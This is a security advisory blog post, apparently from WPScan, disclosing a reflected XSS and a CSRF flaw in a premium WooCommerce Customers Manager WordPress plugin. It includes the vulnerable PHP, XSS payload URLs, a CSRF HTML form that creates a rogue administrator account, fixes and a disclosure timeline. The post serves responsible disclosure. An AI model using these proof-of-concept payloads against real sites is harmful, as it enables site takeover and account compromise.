---
layout: post
title: "WooCommerce Customers Manager WordPress Plugin - Multiple Security Vulnerabilities"
---

## Introduction

A member of the WPScan research team discovered two security vulnerabilities within the premium [WooCommerce Customers Manager](https://codecanyon.net/item/woocommerce-customers-manager/10965432) WordPress plugin, versions less than 26.6.

The following two vulnerabilities were identified and added to our [WordPress vulnerability database](https://wpscan.com):

- [Authenticated Reflected Cross-Site Scripting](https://wpscan.com/vulnerability/ad9dd88c-7ae8-41ac-a0d7-469e146f7817) - CVSS: [7.1 (High)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L)

- [Arbitrary User Account Creation/Update via CSRF](https://wpscan.com/vulnerability/10e2cb9d-7285-4d85-923b-bc1ba97bd51a) - CVSS: [8.8 (High)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)

## Technical Details

While checking if a reported [privilege escalation](https://wpscan.com/vulnerability/126143e0-b0cc-4517-862e-3ac557db744f) vulnerability was properly fixed, it was identified that the issue was still exploitable via a Cross-Site Request Forgery (CSRF) attack. An attempted fix for a second security issue, an Authenticated Cross-Site Scripting(XSS) vulnerability, was also found to not be sufficient, still allowing the attack.

At WPScan we work closely with plugin authors to ensure the fixes that they implement are done correctly, to ensure that our users are kept safe.

### Authenticated Reflected Cross-Site Scripting (XSS)

The `wccm_customers_ids` and `wccm_customers_emails` parameters are output in `href` attributes, after being sanitised with the `sanitize_text_field()` function, which is not appropriate for such case, as payload such as `' injected-attribute=value` will still be injected.

In `classes/admin/WCCM_CustomerGuestList.php`
```php
<h2 class="nav-tab-wrapper">
  <a class='nav-tab' href='?page=woocommerce-customers-manager<?php if($this->filter_by_product_id >0) echo '&filter-by-product='.$this->filter_by_product_id; if(isset($_REQUEST['wccm_customers_ids'])) echo '&wccm_customers_ids='.sanitize_text_field($_REQUEST['wccm_customers_ids']);  if(isset($_REQUEST['wccm_customers_emails'])) echo '&wccm_customers_emails='.sanitize_text_field($_REQUEST['wccm_customers_emails']); echo '&wccm_already_encoded=yes'; ?>'>Registered</a>
  <a class='nav-tab nav-tab-active' href='?page=woocommerce-customers-manager&action=wccm-guests-list<?php if($this->filter_by_product_id >0) echo '&filter-by-product='.$this->filter_by_product_id; if(isset($_REQUEST['wccm_customers_ids'])) echo '&wccm_customers_ids='.sanitize_text_field($_REQUEST['wccm_customers_ids']); if(isset($_REQUEST['wccm_customers_emails'])) echo '&wccm_customers_emails='.sanitize_text_field($_REQUEST['wccm_customers_emails']);?>'>Guests</a>
</h2>
```

#### Proof of Concept (PoC)

Log on to the blog as administraor and open the below URLs:

- https://example.com/wp-admin/admin.php?page=woocommerce-customers-manager&action=wccm-guests-list&wccm_customers_ids=%27+style%3Danimation-name%3Arotation+onanimationstart%3Dalert%28%2FXSS-ids%2F%29+b%3D%27
- https://example.com/wp-admin/admin.php?page=woocommerce-customers-manager&action=wccm-guests-list&wccm_customers_emails=%27+style%3Danimation-name%3Arotation+onanimationstart%3Dalert%28%2FXSS-emails%2F%29+b%3D%27

### Arbitrary User Account Creation/Update via CSRF

The `upload_csv` AJAX action, available to authenticated users, does not have any CSRF check, allowing attackers to make logged in users with the `manage_woocommerce` capability (by default administrator) import arbitrary accounts. This could lead to rogue administrator accounts to be created and the blog being compromised.

In `classes/admin/WCCM_CustomerImport.php`
```php
public function __construct()
{
  add_action( 'wp_ajax_upload_csv', array( &$this, 'process_csv_upload_ajax' ) );
}
function process_csv_upload_ajax()
{
  if(!current_user_can('manage_woocommerce'))
    wp_die();

  $csv_array = explode("<#>", $_POST['csv']);
  $this->process_uploaded_file($csv_array);
  [...]
}
```

#### Proof of Concept (PoC)

Log on to the blog, as a user with the `manage_woocommerce` capability (by default administrator), and open the HTML file below:

```
<html>
  <body>
    <form action="https://example.com/wp-admin/admin-ajax.php" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="action" value="upload_csv" />
      <input type="hidden" name="send-notification-email" value="no" />
      <input type="hidden" name="csv" value='ID","Password","Role","Login","Email"<#>"","Passw0rd","administrator","admin-attacker","admin-attacker@localhost.org"' />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

This will create a new administrator account, with the `admin-attacker` username.

## Remediation

- Proplerly sanitise, validate and escape user inputs (the [esc_attr()](https://developer.wordpress.org/reference/functions/esc_attr/) WP function should be used to escape output in attributes)
- Adds a CSRF check to the `process_csv_upload_ajax()` method to prevent CSRF attacks
  - https://developer.wordpress.org/reference/functions/wp_create_nonce/
  - https://developer.wordpress.org/reference/functions/wp_verify_nonce/

## Timeline

- March 11th, 2021 - Improper fixes identified and confirmed. Vendor contacted via http://www.domenicolagudi.com/#contact
- March 16th, 2021 - No response from vendor, escalated to Envato.
- March 17th, 2021 - v26.6 released, fixing the issues (confirmed on March 30th via source code provided by the vendor).
- March 30th, 2021 - Vulnerabilities published on wpscan.com and sent out to our users.
- April 8th, 2021 - This blog post released.
